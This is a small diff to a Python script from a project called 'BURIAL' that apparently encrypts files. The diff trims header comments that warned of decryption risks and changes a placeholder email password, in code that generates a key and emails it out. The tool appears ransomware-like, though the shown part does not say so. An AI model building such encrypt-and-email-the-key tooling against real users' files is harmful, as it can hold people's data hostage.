@@ -1,6 +1,4 @@
-#this is our first version of the BURIAL project. Please keep in mind of bugs, errors and note that there might be risks in decrypting your files.
-#please also note that some set-up is required. Full guide will be available soon.
-#file is still undergoing progress. Do not try to use this as errors may occur.
+# file in progress...
 
 import time
 import sys
@@ -161,7 +159,7 @@ def main():
     print(f"{GREEN}[+] Key generated.{RESET}")
     # Send the key to your email
     sender_email = "your-email@gmail.com"  # Replace with your email
-    sender_password = "xxxx xxxx xxxx"  # Replace with your email password (16 characters)
+    sender_password = "xxxx xxxx xxxx xxxx"  # Replace with your email password (16 characters)
     recipient_email = "your-email@gmail.com"  # Replace with your email
     send_key_via_email(key, recipient_email, sender_email, sender_password)
 
